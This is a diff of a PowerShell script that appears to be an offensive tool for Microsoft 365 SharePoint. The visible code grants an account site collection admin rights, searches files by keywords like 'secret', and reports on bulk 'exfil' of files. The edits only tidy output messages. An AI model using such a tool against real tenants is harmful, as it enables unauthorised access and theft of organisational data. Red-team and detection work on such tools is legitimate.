@@ -10,14 +10,14 @@ function GrantAccessToSharpointSite {
     $target_site_url = $global:sharepoint_site_url
 
     #Grant access to site
-    Write-Host "Attempting to grant access to SharePoint site..." -ForegroundColor Gray
+    Write-Host "`nAttempting to grant access to SharePoint site..." -ForegroundColor Gray
     try {
         Set-SPOUser -Site $target_site_url -LoginName $target_account -IsSiteCollectionAdmin $true -ErrorAction Stop
         Start-Sleep -Seconds 5
-        Write-Host "[Success] Granted '$target_account' access to SharePoint site: $target_site_name" -ForegroundColor Yellow -BackgroundColor Black
+        Write-Host "`n[Success] Granted '$target_account' access to SharePoint site: $target_site_name" -ForegroundColor Yellow
     }
     catch {
-        Write-Host "[Error] Failed to get access to SharePoint site: $target_site_name" -ForegroundColor Red
+        Write-Host "`n[Error] Failed to get access to SharePoint site: $target_site_name" -ForegroundColor Red
     }
  }
 
@@ -40,12 +40,12 @@ function GrantAccessToSharpointSite {
         $keyword = Read-Host -Prompt "`nEnter a keyword to search matching files (Eg: secret or exit search)"
         
         if ($keyword -in "",$null) {
-            Write-Host "`n[Input Error] Search term cannot be blank. I am sure you can think of a interesting file you would like to look for.`n" -ForegroundColor DarkRed
-            Write-Host "Note: You can enter 'exit search' to go back to menu" -ForegroundColor Gray
+            Write-Host "`n[Input Error] Search term cannot be blank. I am sure you can think of an interesting file you would like to look for`n" -ForegroundColor Red
+            Write-Host "[Tip] You can type 'exit search' in search term to exit this module" -ForegroundColor Gray
         }
 
         if ($keyword -eq "exit search") {
-            Write-Host "`nExiting file search!`n" -ForegroundColor Gray
+            Write-Host "`nExiting file search" -ForegroundColor Gray
             break
         }
 
@@ -57,14 +57,14 @@ function GrantAccessToSharpointSite {
             $search_result = Find-PnPFile -Match *$keyword* 
             
             if ($null -eq $search_result) {
-                Write-Host "No results found matching the search." -ForegroundColor Gray
+                Write-Host "`nNo results found matching the search" -ForegroundColor Red
             }
             elseif ($search_result.Count -gt 20){
-                Write-Host "Search returned $($search_result.Count). Returning first 10 matches here. Full results are stored in the /Outputs directory" -ForegroundColor Gray
+                Write-Host "`nSearch returned $($search_result.Count) matches. Returning first 10 matches. Full results are stored in the /Outputs directory" -ForegroundColor Gray
                 $search_result | Select-Object -First 10
                 $search_result | Out-File -FilePath .\Outputs\SharePoint_File_Search_Report_$current_time.txt -Append
-                Write-Host "[Success] Search completed!" -ForegroundColor Yellow
-                Write-Host "`nNote: You can enter 'exit search' to go back to menu" -ForegroundColor Gray
+                Write-Host "`n[Success] Search completed!" -ForegroundColor Yellow
+                Write-Host "`n[Tip] You can enter 'exit search' to go back to menu" -ForegroundColor Gray
             }  
             else{
                 $search_result
@@ -97,7 +97,7 @@ function GrantAccessToSharpointSite {
     }
 
     #Check user preference
-    Write-Host "`n[Note] To exfil specific file types enter the file extension in search like 'docx', 'pdf', 'DWG'" -ForegroundColor DarkGray
+    Write-Host "`n[Tip] To exfil specific file types enter the file extension in search like 'docx', 'pdf', 'DWG'" -ForegroundColor DarkGray
     $user_search_term = Read-Host -Prompt "`nEnter a term or file extension -OR- leave blank and hit 'Enter' if you would like to exfil all files"
 
     Write-Host "`nInitiating exfil from SharePoint..." -ForegroundColor Gray
@@ -132,6 +132,6 @@ function GrantAccessToSharpointSite {
     Write-Host "`nSharePoint exfil details:" -ForegroundColor Gray
     Write-Host "Total files exfiltrated: $counter/$($all_files.Length)"  -ForegroundColor Gray
     Write-Host "Total data exfiltrated: $download_size"  -ForegroundColor Gray
-    Write-Host "`n[Success] SharePoint data exfiltration completed!" -ForegroundColor Yellow
+    Write-Host "`n[Success] SharePoint data exfiltrated!" -ForegroundColor Yellow
 }
 
